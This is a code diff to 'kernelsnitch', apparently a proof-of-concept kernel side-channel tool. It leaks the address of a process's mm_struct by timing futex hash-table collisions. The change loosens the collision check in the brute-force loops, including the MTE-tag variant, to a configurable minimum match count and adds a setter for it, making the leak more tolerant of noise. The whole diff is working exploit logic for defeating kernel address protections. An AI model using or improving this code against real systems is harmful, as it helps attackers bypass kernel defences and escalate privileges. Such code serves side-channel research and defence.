@@ -78,6 +78,7 @@ struct kernelsnitch_shared_state {
     size_t appended_futexes;
     size_t repeat_measurement;
     size_t average;
+    size_t min_collision_matches;
 
     volatile unsigned char *futexes;
     volatile unsigned char inc_futex[KS_PAGE_SIZE];
@@ -257,11 +258,26 @@ static void *__mm_leak(void *arg)
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 #endif
 
-                size_t found_hash = 1;
+                size_t found_hash = 0;
                 if (!ks->mte_enabled) {
                     // test the mm_struct candidate
-                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                    size_t target_hash =
+                        futex_hash(ks->futex_addrs[0], mm_struct_candidate);
+                    size_t matches = 0;
+                    for (size_t i = 1; i < ks->collisions; ++i) {
+                        if (target_hash ==
+                            futex_hash(ks->futex_addrs[i],
+                                       mm_struct_candidate)) {
+                            matches++;
+                        }
+                        size_t remaining = ks->collisions - i - 1;
+                        if (matches >= ks->min_collision_matches ||
+                            matches + remaining <
+                                ks->min_collision_matches) {
+                            break;
+                        }
+                    }
+                    found_hash = matches >= ks->min_collision_matches;
                     if (found_hash) {
                         ks->mm_struct = mm_struct_candidate;
                         ks->found = 1;
@@ -278,9 +294,24 @@ static void *__mm_leak(void *arg)
                          ++tag_candidate) {
                         size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                         __mm_struct_candidate |= (tag_candidate << 56);
-                        found_hash = 1;
-                        for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
+                        size_t target_hash = futex_hash(
+                            ks->futex_addrs[0], __mm_struct_candidate);
+                        size_t matches = 0;
+                        for (size_t i = 1; i < ks->collisions; ++i) {
+                            if (target_hash ==
+                                futex_hash(ks->futex_addrs[i],
+                                           __mm_struct_candidate)) {
+                                matches++;
+                            }
+                            size_t remaining = ks->collisions - i - 1;
+                            if (matches >= ks->min_collision_matches ||
+                                matches + remaining <
+                                    ks->min_collision_matches) {
+                                break;
+                            }
+                        }
+                        found_hash =
+                            matches >= ks->min_collision_matches;
                         if (found_hash) {
                             if (ks->verbose)
                                 pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
@@ -325,6 +356,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->appended_futexes = APPENDED_FUTEXES;
     ks->repeat_measurement = REPEAT_MEASUREMENT;
     ks->average = AVERAGE;
+    ks->min_collision_matches = __collision_cnt - 1;
 
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = 256*ks->cpu_cnt;
@@ -376,6 +408,15 @@ void kernelsnitch_set_profile(
     ks->appended_futexes = appended_futexes;
     ks->repeat_measurement = repeat_measurement;
     ks->average = average;
+}
+
+void kernelsnitch_set_min_collision_matches(
+    struct kernelsnitch_shared_state *ks, size_t min_collision_matches)
+{
+    ASSERT_pr((min_collision_matches > 0 &&
+               min_collision_matches < ks->collisions),
+              "invalid minimum collision match count\n");
+    ks->min_collision_matches = min_collision_matches;
 }
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
